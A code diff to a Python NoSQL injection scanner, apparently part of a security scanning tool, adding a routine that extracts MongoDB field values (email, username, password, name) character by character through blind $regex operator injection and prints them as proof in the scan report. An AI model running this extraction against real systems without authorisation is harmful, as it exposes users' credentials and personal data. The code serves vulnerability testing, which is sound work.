@@ -133,6 +133,7 @@ class InjectionResult:
     waf_detected: WAFType = WAFType.NONE
     can_extract_data: bool = False
     rce_possible: bool = False
+    extracted_data: dict[str, Any] = field(default_factory=dict)
 
 
 @dataclass
@@ -949,6 +950,9 @@ class NoSQLScanner(ScanModule):
     def _normalize_url(self, host: str) -> str:
         """Normalize URL with proper scheme."""
         if not host.startswith(("http://", "https://")):
+            port = host.split(":")[-1] if ":" in host else "443"
+            if port in ("80", "8080", "8000", "3000", "5000", "8888"):
+                return f"http://{host}"
             return f"https://{host}"
         return host
     
@@ -1627,9 +1631,92 @@ class NoSQLScanner(ScanModule):
         return False
     
     # =========================================================================
+    # DATA EXTRACTION (Real exploitation proof via $regex)
+    # =========================================================================
+
+    async def _extract_data_regex(
+        self,
+        client: httpx.AsyncClient,
+        url: str,
+        baseline: BaselineResponse,
+        rate_limiter: RateLimiter,
+    ) -> dict[str, Any]:
+        """Extract field values via MongoDB $regex brute-force.
+
+        Uses binary search with $regex to extract field values character
+        by character. Works on any MongoDB target with operator injection.
+        Returns dict with extracted field values as proof.
+        """
+        extracted: dict[str, Any] = {}
+        charset = "abcdefghijklmnopqrstuvwxyz0123456789.@_-"
+        headers = {"Content-Type": "application/json"}
+
+        # Fields most likely to contain interesting data
+        target_fields = ["email", "username", "password", "name"]
+
+        for field_name in target_fields:
+            value = ""
+            for _ in range(30):  # Max 30 chars per field
+                found = False
+                for ch in charset:
+                    # Build $regex payload: field starts with value+ch
+                    escaped = re.escape(value + ch)
+                    payload = {field_name: {"$regex": f"^{escaped}"}}
+
+                    await rate_limiter.acquire()
+                    try:
+                        resp = await client.post(url, json=payload, headers=headers)
+                        # If response differs from "no match" baseline → char is correct
+                        if resp.status_code == 200 and len(resp.text) > baseline.content_length * 0.5:
+                            value += ch
+                            found = True
+                            break
+                    except Exception:
+                        continue
+
+                if not found:
+                    break
+
+            if len(value) >= 3:  # Only keep if we got meaningful data
+                # Redact sensitive values (show pattern, not full data)
+                if field_name == "password":
+                    extracted[field_name] = value[:2] + "*" * (len(value) - 2) + f" ({len(value)} chars)"
+                else:
+                    extracted[field_name] = value
+                logger.info(f"[NoSQL] $regex extracted {field_name}: {value[:5]}...")
+
+            if len(extracted) >= 2:
+                break  # Enough proof
+
+        return extracted
+
+    async def _run_post_detection_extraction(
+        self,
+        client: httpx.AsyncClient,
+        url: str,
+        result: InjectionResult,
+        baseline: BaselineResponse,
+        rate_limiter: RateLimiter,
+    ) -> None:
+        """Run data extraction after NoSQL injection confirmed. Updates result in-place."""
+        if not result.can_extract_data:
+            return
+
+        try:
+            extracted = await self._extract_data_regex(
+                client, url, baseline, rate_limiter
+            )
+            if extracted:
+                result.extracted_data = extracted
+                result.evidence += f"\nExtracted data proof: {list(extracted.keys())}"
+                logger.info(f"[NoSQL] Post-detection extraction: {list(extracted.keys())}")
+        except Exception as e:
+            logger.debug(f"[NoSQL] Post-detection extraction failed: {e}")
+
+    # =========================================================================
     # API ENDPOINTS TESTING
     # =========================================================================
-    
+
     async def _test_api_endpoints(
         self,
         client: httpx.AsyncClient,
@@ -2065,6 +2152,11 @@ class NoSQLScanner(ScanModule):
         
         if result.can_extract_data:
             description += "\n\n⚠️ **Data extraction possible via blind injection**"
+
+        if result.extracted_data:
+            description += "\n\n**Extracted Data (proof):**"
+            for k, v in result.extracted_data.items():
+                description += f"\n- `{k}`: `{v}`"
         
         remediation = """1. **Use parameterized queries** - Never concatenate user input into queries
 2. **Input validation** - Validate all input against expected types
